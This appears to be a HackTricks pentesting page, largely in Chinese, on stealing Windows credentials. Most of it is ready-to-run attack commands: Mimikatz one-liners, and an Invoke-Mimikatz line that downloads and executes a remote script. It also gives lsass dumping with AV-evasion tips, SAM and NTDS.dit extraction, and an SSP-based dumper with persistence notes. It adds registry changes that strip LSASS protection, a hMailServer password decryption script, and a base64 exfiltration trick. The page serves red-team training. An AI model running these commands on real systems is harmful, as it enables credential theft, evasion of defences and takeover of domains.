# 窃取 Windows Credentials

{{#include ../../banners/hacktricks-training.md}}

## Credentials Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**在此页面中查找 Mimikatz 可以做的其他事情** [**this page**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**在此了解一些可能的凭据保护措施。**](credentials-protections.md) **这些保护可能会阻止 Mimikatz 提取某些凭据。**

## 使用 Meterpreter 的凭据

使用我创建的 [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) 来在受害者内部 **search for passwords and hashes**。
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## 绕过 AV

### Procdump + Mimikatz

由于 **Procdump 来自** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**是一个合法的 Microsoft 工具**，因此不会被 Defender 检测到.\
你可以使用此工具来 **dump the lsass process**, **download the dump** 并从 dump **extract** **credentials locally**。

你也可以使用 [SharpDump](https://github.com/GhostPack/SharpDump).
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
此过程可通过 [SprayKatz](https://github.com/aas-n/spraykatz) 自动完成：`./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**注意**：一些 **AV** 可能会将使用 **procdump.exe to dump lsass.exe** 识别为 **恶意**，这是因为它们正在 **检测** 字符串 **"procdump.exe" and "lsass.exe"**。因此，**传递** 作为 **参数** 的 **PID** 到 procdump，而 **不是** 使用 **名称 lsass.exe**，通常会更加 **隐蔽**。

### 使用 **comsvcs.dll** 转储 lsass

位于 `C:\Windows\System32` 的 **comsvcs.dll** DLL 在崩溃时负责 **转储进程内存**。该 DLL 包含一个名为 **`MiniDumpW`** 的 **函数**，用于通过 `rundll32.exe` 调用。\
前两个参数无关紧要，但第三个参数分为三部分。要转储的进程 ID 为第一部分，转储文件的位置为第二部分，第三部分必须严格为单词 **full**。没有其他选项。\
在解析这三部分后，DLL 会创建转储文件并将指定进程的内存写入该文件。\
可以使用 **comsvcs.dll** 来转储 lsass 进程，从而无需上传并执行 procdump。该方法有详细描述，见 [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords)。

执行时使用以下命令：
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**您可以使用** [**lssasy**](https://github.com/Hackndo/lsassy)**自动化此过程。**

### **使用 Task Manager 转储 lsass**

1. 在任务栏上右键单击并打开 Task Manager
2. 单击 More details
3. 在 Processes 选项卡中搜索 "Local Security Authority Process" 进程
4. 右键单击 "Local Security Authority Process" 进程并单击 "Create dump file"。

### 使用 procdump 转储 lsass

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) 是一个由 Microsoft 签名的二进制文件，属于 [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) 套件的一部分。
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## 使用 PPLBlade 转储 lsass

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) 是一个受保护进程转储工具，支持对内存转储进行混淆并在远程工作站间传输，而无需将其写入磁盘。

**主要功能**:

1. 绕过 PPL 保护
2. 混淆内存转储文件以规避 Defender 的基于签名的检测机制
3. 使用 RAW 和 SMB 上传方法上传内存转储，而不将其写入磁盘 (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – 基于 SSP 的 LSASS 转储（不使用 MiniDumpWriteDump）

Ink Dragon ships a three-stage dumper dubbed **LalsDumper** that never calls `MiniDumpWriteDump`, so EDR hooks on that API never fire:

1. **Stage 1 loader (`lals.exe`)** – 在 `fdp.dll` 中搜索由 32 个小写字符 `d` 组成的占位符，用 `rtu.txt` 的绝对路径覆盖它，将修补后的 DLL 保存为 `nfdp.dll`，并调用 `AddSecurityPackageA("nfdp","fdp")`。这会强制 **LSASS** 将恶意 DLL 作为新的 Security Support Provider (SSP) 加载。
2. **Stage 2 inside LSASS** – 当 LSASS 加载 `nfdp.dll` 时，DLL 读取 `rtu.txt`，将每个字节与 `0x20` 做 XOR，并将解码后的 blob 映射到内存中然后转移执行。
3. **Stage 3 dumper** – 映射的 payload 重新实现了 MiniDump 逻辑，使用从哈希化的 API 名称解析出的 **direct syscalls**（`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`）。一个名为 `Tom` 的专用导出会打开 `%TEMP%\<pid>.ddt`，将压缩的 LSASS 转储写入该文件，然后关闭句柄以便稍后进行 exfiltration。

Operator notes:

* 将 `lals.exe`、`fdp.dll`、`nfdp.dll` 和 `rtu.txt` 保持在同一目录。Stage 1 会将硬编码的占位符改写为 `rtu.txt` 的绝对路径，因此分开放置会破坏链条。
* 通过将 `nfdp` 追加到 `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` 来注册。你可以自己预置该值，使 LSASS 在每次启动时重新加载该 SSP。
* `%TEMP%\*.ddt` 文件是压缩的转储。先在本地解压，然后将其交给 Mimikatz/Volatility 做凭证提取。
* 运行 `lals.exe` 需要 admin/SeTcb 权限以使 `AddSecurityPackageA` 成功；调用返回后，LSASS 会透明地加载该恶意 SSP 并执行 Stage 2。
* 从磁盘删除 DLL 并不会将其从 LSASS 中驱逐。要么删除注册表条目并重启 LSASS（重启系统），要么保留它以实现长期持久性。

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### 从目标 DC 导出 NTDS.dit
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### 从目标 DC 导出 NTDS.dit 的密码历史
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### 显示每个 NTDS.dit 帐户的 pwdLastSet 属性
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

这些文件应该位于 _C:\windows\system32\config\SAM_ 和 _C:\windows\system32\config\SYSTEM_。但**你不能用常规方式直接复制它们**，因为它们受保护。

### 来自 Registry

窃取这些文件最简单的方法是从 Registry 获取一份副本：
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
将那些文件**下载**到你的 Kali 主机，并使用以下命令**提取 hashes**：
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

您可以使用此服务复制受保护的文件。您需要是 Administrator。

#### 使用 vssadmin

vssadmin 二进制文件仅在 Windows Server 版本中可用。
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
但你也可以使用 **Powershell** 完成相同的操作。下面是一个 **如何复制 SAM file** 的示例（所用硬盘为 "C:"，并保存到 C:\users\Public），但你也可以用它来复制任何受保护的文件：
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
书中的代码：[https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)

### Invoke-NinjaCopy

最后，你也可以使用 [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) 来复制 SAM、SYSTEM 和 ntds.dit。
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

The **NTDS.dit** file is known as the heart of **Active Directory**, holding crucial data about user objects, groups, and their memberships. It's where the **password hashes** for domain users are stored. This file is an **Extensible Storage Engine (ESE)** database and resides at **_%SystemRoom%/NTDS/ntds.dit_**.

Within this database, three primary tables are maintained:

- **Data Table**: This table is tasked with storing details about objects like users and groups.
- **Link Table**: It keeps track of relationships, such as group memberships.
- **SD Table**: **Security descriptors** for each object are held here, ensuring the security and access control for the stored objects.

More information about this: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows uses _Ntdsa.dll_ to interact with that file and its used by _lsass.exe_. Then, **part** of the **NTDS.dit** file could be located **inside the `lsass`** memory (you can find the latest accessed data probably because of the performance improve by using a **cache**).

#### 在 NTDS.dit 中解密 hashes

哈希被加密了 3 次：

1. 使用 **BOOTKEY** 和 **RC4** 解密 Password Encryption Key (**PEK**)。
2. 使用 **PEK** 和 **RC4** 解密该 **hash**。
3. 使用 **DES** 解密该 **hash**。

**PEK** 在每个 **domain controller** 中具有 **相同的值**，但它在 **NTDS.dit** 文件中被使用域控制器的 **SYSTEM 文件的 BOOTKEY（不同域控制器之间不同）** 进行 **加密**。这就是为什么要从 NTDS.dit 文件获取凭据时 **需要 NTDS.dit 和 SYSTEM 文件** (_C:\Windows\System32\config\SYSTEM_) 的原因。

### Copying NTDS.dit using Ntdsutil

自 Windows Server 2008 起可用。
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
你也可以使用 [**volume shadow copy**](#stealing-sam-and-system) 技巧来复制 **ntds.dit** 文件。请记住，你还需要一份 **SYSTEM file** 的副本（同样， [**dump it from the registry or use the volume shadow copy**](#stealing-sam-and-system) 技巧）。

### **从 NTDS.dit 提取 hashes**

一旦你 **获得** 了文件 **NTDS.dit** 和 **SYSTEM**，就可以使用诸如 _secretsdump.py_ 之类的工具来 **提取 hashes**：
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
您也可以使用有效的域管理员用户**自动提取它们**:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
对于 **较大的 NTDS.dit 文件**，建议使用 [gosecretsdump](https://github.com/c-sto/gosecretsdump) 提取。

最后，你也可以使用 **metasploit module**：_post/windows/gather/credentials/domain_hashdump_ 或者 **mimikatz** `lsadump::lsa /inject`

### **将 NTDS.dit 中的域对象提取到 SQLite 数据库**

可以使用 [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) 将 NTDS 对象提取到 SQLite 数据库。不仅会提取 secrets，还会导出整个对象及其属性，以便在已获取原始 NTDS.dit 文件时进行进一步的信息提取。
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive 是可选的，但允许对机密进行解密 (NT & LM hashes, supplemental credentials such as cleartext passwords, kerberos or trust keys, NT & LM password histories)。除了其他信息之外，还会提取以下数据：用户和计算机账户及其 hashes、UAC flags、最后 logon 和 password change 的时间戳、账户描述、名称、UPN、SPN、groups 及递归成员关系、organizational units tree 及其成员、trusted domains 及其 trusts type、direction 和 attributes...

## Lazagne

Download the binary from [here](https://github.com/AlessandroZ/LaZagne/releases). 你可以使用此二进制文件从多个软件中提取 credentials。
```
lazagne.exe all
```
## 用于从 SAM 和 LSASS 提取凭据的其他工具

### Windows credentials Editor (WCE)

该工具可用于从内存中提取凭据。下载地址： [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

从 SAM 文件中提取凭据
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

从 SAM file 中提取 credentials
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

从以下地址下载:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) 并只需 **执行它**，密码将被提取。

## 挖掘空闲的 RDP 会话并削弱安全控制

Ink Dragon 的 FinalDraft RAT 包含一个 `DumpRDPHistory` tasker，其技术对任何 red-teamer 都很有用：

### DumpRDPHistory 风格的遥测收集

* **出站 RDP 目标** – 解析每个用户 hive，路径为 `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`。每个子键存储服务器名称、`UsernameHint` 和最后写入时间戳。你可以用 PowerShell 复现 FinalDraft 的逻辑：

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **入站 RDP 证据** – 查询 `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` 日志中 Event IDs **21**（成功登录）和 **25**（断开连接），以映射谁管理了该主机：

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

一旦你知道哪个 Domain Admin 经常连接，在其 **断开** 会话仍然存在时转储 LSASS（使用 LalsDumper/Mimikatz）。CredSSP + NTLM 回退会将他们的 verifier 和 tokens 留在 LSASS 中，然后可以通过 SMB/WinRM 重放以获取 `NTDS.dit` 或在域控制器上设置持久性。

### Registry downgrades targeted by FinalDraft

同一 implant 还会篡改多个注册表键以使凭证窃取更容易：
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* 设置 `DisableRestrictedAdmin=1` 会在 RDP 期间强制重用全部凭证/票证，从而启用类似 pass-the-hash 的 pivots。
* `LocalAccountTokenFilterPolicy=1` 禁用 UAC 令牌过滤，使本地管理员在网络上获得不受限制的令牌。
* `DSRMAdminLogonBehavior=2` 允许 DSRM 管理员在 DC 在线时登录，为攻击者提供另一个内置的高权限帐户。
* `RunAsPPL=0` 移除 LSASS PPL 保护，使 LalsDumper 等转储工具轻松访问内存。

## hMailServer database credentials (post-compromise)

hMailServer 在 `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` 的 `[Database] Password=` 下存储其数据库密码。该值使用 Blowfish 加密，静态密钥为 `THIS_KEY_IS_NOT_SECRET`，并进行了 4 字节字的字节序交换。使用 INI 中的十六进制字符串和下面的 Python 片段：
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
使用明文密码，复制 SQL CE 数据库以避免文件锁，加载 32 位提供程序，并在查询哈希之前如有必要进行升级：
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
The `accountpassword` column uses the hMailServer hash format (hashcat mode `1421`). Cracking these values can provide reusable credentials for WinRM/SSH pivots.
## LSA Logon Callback Interception (LsaApLogonUserEx2)

Some tooling captures **plaintext logon passwords** by intercepting the LSA logon callback `LsaApLogonUserEx2`. The idea is to hook or wrap the authentication package callback so credentials are captured **during logon** (before hashing), then written to disk or returned to the operator. This is commonly implemented as a helper that injects into or registers with LSA, and then records each successful interactive/network logon event with the username, domain and password.

Operational notes:
- Requires local admin/SYSTEM to load the helper in the authentication path.
- Captured credentials appear only when a logon occurs (interactive, RDP, service, or network logon depending on the hook).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) stores saved connection information in a per-user `sqlstudio.bin` file. Dedicated dumpers can parse the file and recover saved SQL credentials. In shells that only return command output, the file is often exfiltrated by encoding it as Base64 and printing it to stdout.
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
在 operator 端，重建该文件并在本地运行 dumper 以恢复 credentials：
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## 参考资料

- [Unit 42 – An Investigation Into Years of Undetected Operations Targeting High-Value Sectors](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../../banners/hacktricks-training.md}}
